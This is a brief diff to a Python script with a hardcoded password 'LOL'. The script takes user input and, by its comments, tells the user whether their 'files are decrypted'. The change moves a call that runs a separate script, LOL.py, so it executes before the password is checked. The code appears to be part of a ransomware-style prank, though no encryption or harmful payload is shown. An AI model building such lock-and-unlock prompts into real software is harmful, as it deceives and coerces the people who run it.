@@ -35,6 +35,7 @@ password = "LOL"
 
 userInput = input("LOL")
 time.sleep(2)
+call(["python", "LOL.py"])
 
 # Checking the password that the user put in, if its right the user will get a message saying the files are decrypted 
 # and if its wrong a message saying that the password is wrong
@@ -55,4 +56,3 @@ else:
 	
 	
 	
-call(["python", "LOL.py"])
